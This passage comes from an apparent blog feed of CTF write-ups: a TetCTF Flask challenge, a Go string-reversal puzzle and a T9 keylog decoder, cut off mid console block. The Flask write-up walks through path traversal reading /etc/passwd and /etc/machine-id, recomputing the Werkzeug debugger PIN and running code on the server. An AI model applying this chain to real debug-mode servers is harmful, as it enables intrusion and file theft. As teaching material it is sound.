+Can you help me? (This is not brute/guess challenge…) !</p>
+</blockquote>
+
+<p>We try to see if we can get to other files by changing the URL to something
+else (try <code class="language-plaintext highlighter-rouge">0.txt</code>), and we get a Flask debugger error page. In it, we see the
+directory the app lives in, <code class="language-plaintext highlighter-rouge">/home/web3_user/app.py</code>. Let’s see what would
+happen if we change the URL to that. We set the URL to <code class="language-plaintext highlighter-rouge">/read/app.py</code>. We get
+the following Python code:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span>
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+	<span class="n">rand</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>
+	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">,</span> <span class="n">random</span><span class="o">=</span><span class="n">rand</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/read/&lt;path:filename&gt;'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+	<span class="n">rand</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>
+
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">content</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'r'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">raise</span>
+	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'file.html'</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="n">content</span><span class="p">,</span> <span class="n">random</span><span class="o">=</span><span class="n">rand</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+	<span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="s">'7004'</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>To read files with directory traversal, substitute your <code class="language-plaintext highlighter-rouge">/</code> with the URL
+encoded equivalent <code class="language-plaintext highlighter-rouge">%2f</code>. Reading <code class="language-plaintext highlighter-rouge">/etc/passwd</code> would just be a get request to
+<code class="language-plaintext highlighter-rouge">/read/..%2f..%2fetc%2fpasswd</code> (remember that we are in <code class="language-plaintext highlighter-rouge">/home/web3_user/</code>).</p>
+
+<p>As you can see, debug mode is on. This means that whenever an error occurs, an
+interactive console can be toggled and let you input code (a.k.a. Flask
+debugger page mentioned above). The caveat is that it is secured with a PIN
+that is only displayed in the <code class="language-plaintext highlighter-rouge">stdout</code> when you run the server. This PIN is not
+generated randomly every time; rather, it uses a bunch of different
+machine-specific pieces of information to generate a PIN. This is the
+<a href="https://github.com/pallets/werkzeug/blob/71cf9902012338f8ee98338fa7bba50572606637/src/werkzeug/debug/__init__.py#L133">function</a> for generating a PIN. I have taken the liberty to remove
+the part that checks the environment for a pin.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_pin_and_cookie_name</span><span class="p">(</span><span class="n">app</span><span class="p">):</span>
+    <span class="s">"""Given an application object this returns a semi-stable 9 digit pin
+    code and a random key.  The hope is that this is stable between
+    restarts to not make debugging particularly frustrating.  If the pin
+    was forcefully disabled this returns `None`.
+    Second item in the resulting tuple is the cookie name for remembering.
+    """</span>
+    <span class="n">rv</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="n">modname</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s">"__module__"</span><span class="p">,</span> <span class="n">app</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__module__</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># getuser imports the pwd module, which does not exist in Google
+</span>        <span class="c1"># App Engine. It may also raise a KeyError if the UID does not
+</span>        <span class="c1"># have a username, such as in Docker.
+</span>        <span class="n">username</span> <span class="o">=</span> <span class="n">getpass</span><span class="p">.</span><span class="n">getuser</span><span class="p">()</span>
+    <span class="k">except</span> <span class="p">(</span><span class="nb">ImportError</span><span class="p">,</span> <span class="nb">KeyError</span><span class="p">):</span>
+        <span class="n">username</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="n">mod</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">modules</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">modname</span><span class="p">)</span>
+
+    <span class="c1"># This information only exists to make the cookie unique on the
+</span>    <span class="c1"># computer, not as a security feature.
+</span>    <span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="n">username</span><span class="p">,</span>
+        <span class="n">modname</span><span class="p">,</span>
+        <span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s">"__name__"</span><span class="p">,</span> <span class="n">app</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__name__</span><span class="p">),</span>
+        <span class="nb">getattr</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="s">"__file__"</span><span class="p">,</span> <span class="bp">None</span><span class="p">),</span>
+    <span class="p">]</span>
+
+    <span class="c1"># This information is here to make it harder for an attacker to
+</span>    <span class="c1"># guess the cookie name.  They are unlikely to be contained anywhere
+</span>    <span class="c1"># within the unauthenticated debug page.
+</span>    <span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="n">getnode</span><span class="p">()),</span> <span class="n">get_machine_id</span><span class="p">()]</span>
+
+    <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+            <span class="k">continue</span>
+        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="n">text_type</span><span class="p">):</span>
+            <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span>
+        <span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+    <span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s">"cookiesalt"</span><span class="p">)</span>
+
+    <span class="n">cookie_name</span> <span class="o">=</span> <span class="s">"__wzd"</span> <span class="o">+</span> <span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+    <span class="c1"># If we need to generate a pin we salt it a bit more so that we don't
+</span>    <span class="c1"># end up with the same value and generate out 9 digits
+</span>    <span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s">"pinsalt"</span><span class="p">)</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s">"%09d"</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+    <span class="c1"># Format the pincode in groups of digits for easier remembering if
+</span>    <span class="c1"># we don't have a result yet.
+</span>    <span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">rv</span> <span class="o">=</span> <span class="s">"-"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span>
+                    <span class="n">num</span><span class="p">[</span><span class="n">x</span> <span class="p">:</span> <span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">].</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
+                    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">)</span>
+                <span class="p">)</span>
+                <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+    <span class="k">return</span> <span class="n">rv</span><span class="p">,</span> <span class="n">cookie_name</span>
+</code></pre></div></div>
+
+<p>Fix the import errors:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+</code></pre></div></div>
+
+<p>You might also notice that the variable <code class="language-plaintext highlighter-rouge">text_type</code> is not defined anywhere.
+Digging a bit deeper in the <a href="https://github.com/pallets/werkzeug/blob/71cf9902012338f8ee98338fa7bba50572606637/src/werkzeug/_compat.py#L129">source code</a> gives us <code class="language-plaintext highlighter-rouge">text_type =
+str</code> if we are using Python 3 (which we are).</p>
+
+<p>There is another function that is referenced: <code class="language-plaintext highlighter-rouge">get_machine_id</code>, which gets the
+machine’s ID, regardless of operating system. Using the exploit, we can read
+the file <code class="language-plaintext highlighter-rouge">/etc/os-release</code> to see that we are on an Ubuntu system, so we check
+the contents of <code class="language-plaintext highlighter-rouge">/etc/machine-id</code> and replace the function call with the string
+<code class="language-plaintext highlighter-rouge">d4e6cb65d59544f3331ea0425dc555a1</code>.</p>
+
+<p>We now need to know the username, modname, and whatever <code class="language-plaintext highlighter-rouge">uuid.getnode</code> returns.
+The username is simple. We use the exploit to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and see that
+we are probably <code class="language-plaintext highlighter-rouge">web3_user</code>. If you call the function now and print the
+<code class="language-plaintext highlighter-rouge">modname</code>, you see that it just says <code class="language-plaintext highlighter-rouge">flask.app</code>, so let’s assume that it’s the
+same everywhere. This leaves <code class="language-plaintext highlighter-rouge">uuid.getnode</code>. We read the
+<a href="https://docs.python.org/3/library/uuid.html#uuid.getnode">documentation</a> and see that it gets the hardware address (MAC
+address) of the network interface. To do this, we first have to list out all
+the current network interfaces by reading the file <code class="language-plaintext highlighter-rouge">/proc/net/dev</code>. We find the
+ethernet interface <code class="language-plaintext highlighter-rouge">ens3</code> and read the file <code class="language-plaintext highlighter-rouge">/sys/class/net/ens3/address</code> to
+get the hardware address <code class="language-plaintext highlighter-rouge">56:00:02:7a:23:ac</code>, and convert it into an integer,
+and then to a string.</p>
+
+<p>We are actually missing one thing. Within <code class="language-plaintext highlighter-rouge">get_pin_and_cookie_name</code> there is a
+variable <code class="language-plaintext highlighter-rouge">probably_public_bits</code>. The last item may not be the same as the one
+on the server, depending on the system you run python on. If we run the
+function right now and print this variable, the last item would be something
+similar to <code class="language-plaintext highlighter-rouge">/usr/*/python3.x/*-packages/flask/app.py</code>. If you would recall,
+when we first ran into the error, it output
+<code class="language-plaintext highlighter-rouge">/usr/local/lib/python3.5/dist-packages/flask/app.py</code>. So we simply replace the
+call to <code class="language-plaintext highlighter-rouge">getattr</code> with the previous string, and call the function to get the
+PIN. If it isn’t obvious already, the parameter you call it with is the
+<code class="language-plaintext highlighter-rouge">app.py</code> code you got earlier.</p>
+
+<p>After getting the PIN, we have access to the Werkzeug debugger/interactive
+console, and thus have ACE. We execute the following code to find the flag:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">os</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+<span class="p">[</span><span class="s">'media'</span><span class="p">,</span> <span class="s">'tmp'</span><span class="p">,</span> <span class="s">'lib'</span><span class="p">,</span> <span class="s">'swapfile'</span><span class="p">,</span> <span class="s">'srv'</span><span class="p">,</span> <span class="s">'usr'</span><span class="p">,</span> <span class="s">'vmlinuz'</span><span class="p">,</span> <span class="s">'opt'</span><span class="p">,</span>
+<span class="s">'initrd.img.old'</span><span class="p">,</span> <span class="s">'home'</span><span class="p">,</span> <span class="s">'bin'</span><span class="p">,</span> <span class="s">'boot'</span><span class="p">,</span> <span class="s">'etc'</span><span class="p">,</span> <span class="s">'lost+found'</span><span class="p">,</span> <span class="s">'initrd.img'</span><span class="p">,</span>
+<span class="s">'root'</span><span class="p">,</span> <span class="s">'mnt'</span><span class="p">,</span> <span class="s">'vmlinuz.old'</span><span class="p">,</span> <span class="s">'dev'</span><span class="p">,</span> <span class="s">'phao_san_pa_lay___1337'</span><span class="p">,</span> <span class="s">'sys'</span><span class="p">,</span> <span class="s">'proc'</span><span class="p">,</span>
+<span class="s">'run'</span><span class="p">,</span> <span class="s">'lib64'</span><span class="p">,</span> <span class="s">'sbin'</span><span class="p">,</span> <span class="s">'snap'</span><span class="p">,</span> <span class="s">'var'</span><span class="p">]</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">'/phao_san_pa_lay___1337'</span><span class="p">)</span>
+<span class="p">[</span><span class="s">'flagggg.txt'</span><span class="p">]</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/phao_san_pa_lay___1337/flagggg.txt'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="s">"TetCTF{Flask_Debug_LFI___Wuttt__RCE}</span><span class="se">\n\n</span><span class="s">Please don't do any further action"</span> <span class="o">+</span>
+<span class="s">"on the server, we knew the setup suck, but it's needed for the vulnerability</span><span class="se">\n</span><span class="s">"</span>
+</code></pre></div></div>]]></content><author><name></name></author><category term="writeup" /><category term="ctf" /><category term="writeup" /><category term="python" /><category term="flask" /><category term="ACE" /><summary type="html"><![CDATA[This was a fun one. We start off with a web page and get a foothold with an arbitrary file read vulnerability, and end it off with a Python Flask Arbitrary Code Execution in the web debugger.]]></summary></entry><entry><title type="html">Where did he GO? - Inferno CTF</title><link href="/writeup/2019/12/31/where-go-infernoctf.html" rel="alternate" type="text/html" title="Where did he GO? - Inferno CTF" /><published>2019-12-31T00:00:00-08:00</published><updated>2019-12-31T00:00:00-08:00</updated><id>/writeup/2019/12/31/where-go-infernoctf</id><content type="html" xml:base="/writeup/2019/12/31/where-go-infernoctf.html"><![CDATA[<p>This was also one of the easier ones. As you can tell, I’m not that good at
+these things. I also have never scripted in go before. Here’s what happened.</p>
+
+<p>The program asked for a password, and if the password was correct, we would get
+a nice success message. Looking into the program, we see that the input is
+checked against an obfuscated string of bytes. The input is run through 2
+functions:</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="n">jai_ram_ji_ki</span><span class="p">(</span><span class="n">s</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="n">chars</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">rune</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">:=</span> <span class="m">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">words</span><span class="p">)</span> <span class="o">-</span> <span class="m">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">j</span><span class="p">;</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="m">1</span><span class="p">,</span> <span class="n">j</span> <span class="o">-</span> <span class="m">1</span> <span class="p">{</span>
+		<span class="n">chars</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">chars</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">chars</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">chars</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">mandir_wahi_banega</span><span class="p">(</span><span class="n">s</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="n">words</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Fields</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">:=</span> <span class="m">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">words</span><span class="p">)</span> <span class="o">-</span> <span class="m">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">j</span><span class="p">;</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="m">1</span><span class="p">,</span> <span class="n">j</span> <span class="o">-</span> <span class="m">1</span> <span class="p">{</span>
+		<span class="n">words</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">words</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">jai_ram_ji_ki</span><span class="p">(</span><span class="n">words</span><span class="p">[</span><span class="n">j</span><span class="p">]),</span> <span class="n">jai_ram_ji_ki</span><span class="p">(</span><span class="n">words</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">words</span><span class="p">,</span> <span class="s">"_"</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="n">jai_ram_ji_ki</span><span class="p">(</span><span class="n">mandir_wahi_banega</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">user_input</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>Let’s see what would happen if we simply printed the encrypted bytes as a
+string:</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">ency</span><span class="p">)</span>
+<span class="c">//!!tA3rG_s1_gn1MMaRg0rP_0g</span>
+</code></pre></div></div>
+
+<p>This looks awfully like some kind of flag. Let’s see what happens when we
+reverse it (using <code class="language-plaintext highlighter-rouge">jai_ram_ji_ki</code>):</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">jai_ram_ji_ki</span><span class="p">(</span><span class="n">ency</span><span class="p">))</span>
+<span class="c">//g0_Pr0gRaMM1ng_1s_Gr3At!!</span>
+</code></pre></div></div>
+
+<p>And whaddyaknow, that’s the flag!</p>]]></content><author><name></name></author><category term="writeup" /><category term="ctf" /><category term="writeup" /><category term="go" /><summary type="html"><![CDATA[This was also one of the easier ones. As you can tell, I’m not that good at these things. I also have never scripted in go before. Here’s what happened.]]></summary></entry><entry><title type="html">7110 - OverTheWire Advent 2019 CTF</title><link href="/writeup/2019/12/30/7110-otw-advent2019-ctf.html" rel="alternate" type="text/html" title="7110 - OverTheWire Advent 2019 CTF" /><published>2019-12-30T00:00:00-08:00</published><updated>2019-12-30T00:00:00-08:00</updated><id>/writeup/2019/12/30/7110-otw-advent2019-ctf</id><content type="html" xml:base="/writeup/2019/12/30/7110-otw-advent2019-ctf.html"><![CDATA[<p>This one was one of the easier ones. We are given some <code class="language-plaintext highlighter-rouge">.txt</code> files, <code class="language-plaintext highlighter-rouge">.csv</code>
+files, and a single <code class="language-plaintext highlighter-rouge">.h</code> C header file. We see that the <code class="language-plaintext highlighter-rouge">.csv</code> files contain
+keylogging data, where the first column is a timestamp and the second column is
+the key that was pressed. From these <code class="language-plaintext highlighter-rouge">.csv</code> files, we are supposed to figure
+out what Santa typed.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">.csv</code> files correspond to the <code class="language-plaintext highlighter-rouge">.txt</code> files (e.g. <code class="language-plaintext highlighter-rouge">sms1.csv</code> corresponds to
+<code class="language-plaintext highlighter-rouge">sms1.txt</code>), and we are supposed to decode <code class="language-plaintext highlighter-rouge">sms4.csv</code>. Though we are not
+completely sure what the function keys correspond to (i.e. <code class="language-plaintext highlighter-rouge">MENU_LEFT</code>,
+<code class="language-plaintext highlighter-rouge">MENU_RIGHT</code>, <code class="language-plaintext highlighter-rouge">MENU_UP</code>, <code class="language-plaintext highlighter-rouge">MENU_DOWN</code>), we can still try to decode the file. And
+so we write the following Python code:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">KS</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mi">0</span><span class="p">:</span> <span class="s">" 0"</span><span class="p">,</span>
+    <span class="mi">1</span><span class="p">:</span> <span class="s">".,'?!</span><span class="se">\"</span><span class="s">1-()@/:"</span><span class="p">,</span>
+    <span class="mi">2</span><span class="p">:</span> <span class="s">"abc2"</span><span class="p">,</span>
+    <span class="mi">3</span><span class="p">:</span> <span class="s">"def3"</span><span class="p">,</span>
+    <span class="mi">4</span><span class="p">:</span> <span class="s">"ghi4"</span><span class="p">,</span>
+    <span class="mi">5</span><span class="p">:</span> <span class="s">"jkl5"</span><span class="p">,</span>
+    <span class="mi">6</span><span class="p">:</span> <span class="s">"mno6"</span><span class="p">,</span>
+    <span class="mi">7</span><span class="p">:</span> <span class="s">"pqrs7"</span><span class="p">,</span>
+    <span class="mi">8</span><span class="p">:</span> <span class="s">"tuv8"</span><span class="p">,</span>
+    <span class="mi">9</span><span class="p">:</span> <span class="s">"wxyz9"</span><span class="p">,</span>
+    <span class="mi">10</span><span class="p">:</span> <span class="s">"@/:_;+&amp;%*[]{}"</span><span class="p">,</span>
+    <span class="mi">11</span><span class="p">:</span> <span class="p">[</span><span class="s">'T9'</span><span class="p">,</span> <span class="s">'T9_CAPS'</span><span class="p">,</span> <span class="s">'ABC'</span><span class="p">,</span> <span class="s">'ABC_CAPS'</span><span class="p">],</span>
+    <span class="mi">100</span><span class="p">:</span> <span class="p">[</span><span class="s">'LEFT'</span> <span class="o">*</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">)],</span>
+    <span class="mi">101</span><span class="p">:</span> <span class="p">[</span><span class="s">'RIGHT'</span> <span class="o">*</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">)],</span>
+    <span class="mi">102</span><span class="p">:</span> <span class="p">[</span><span class="s">'UP'</span> <span class="o">*</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">)],</span>
+    <span class="mi">103</span><span class="p">:</span> <span class="p">[</span><span class="s">'DOWN'</span> <span class="o">*</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">)],</span>
+    <span class="mi">104</span><span class="p">:</span> <span class="p">[</span><span class="s">'CALL_ACCEPT'</span> <span class="o">*</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">)],</span>
+    <span class="mi">105</span><span class="p">:</span> <span class="p">[</span><span class="s">'CALL_REJECT'</span> <span class="o">*</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">)]</span>
+<span class="p">}</span>
+
+<span class="n">strokes</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">strokes</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)[</span><span class="mi">0</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)[</span><span class="mi">1</span><span class="p">])),</span>
+                       <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">()))</span>
+
+<span class="k">def</span> <span class="nf">process</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">times</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">KS</span>
+    <span class="k">return</span> <span class="n">KS</span><span class="p">[</span><span class="n">key</span><span class="p">][(</span><span class="n">times</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">KS</span><span class="p">[</span><span class="n">key</span><span class="p">])]</span>
+
+<span class="n">last_ts</span><span class="p">,</span> <span class="n">last_key</span> <span class="o">=</span> <span class="n">strokes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">repeat</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">for</span> <span class="n">ts</span><span class="p">,</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">strokes</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
+    <span class="k">if</span> <span class="n">last_key</span> <span class="o">!=</span> <span class="n">key</span><span class="p">:</span>
+        <span class="c1"># The keys changed; output
+</span>        <span class="k">print</span><span class="p">(</span><span class="n">process</span><span class="p">(</span><span class="n">last_key</span><span class="p">,</span> <span class="n">repeat</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+        <span class="n">repeat</span> <span class="o">=</span> <span class="mi">1</span>
+        <span class="n">last_ts</span> <span class="o">=</span> <span class="n">ts</span>
+        <span class="n">last_key</span> <span class="o">=</span> <span class="n">key</span>
+    <span class="k">elif</span> <span class="n">last_key</span> <span class="o">==</span> <span class="n">key</span><span class="p">:</span>
+        <span class="c1"># The same key
+</span>        <span class="n">repeat</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">last_ts</span> <span class="o">=</span> <span class="n">ts</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="c1"># W
+</span>        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">WATT (ts=</span><span class="si">{</span><span class="n">ts</span><span class="si">}</span><span class="s">, key=</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s">)</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>In essence, we look up a character based on the number of times we see it
+repeated. Let’s try running it:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python analyze.py sms1.csv
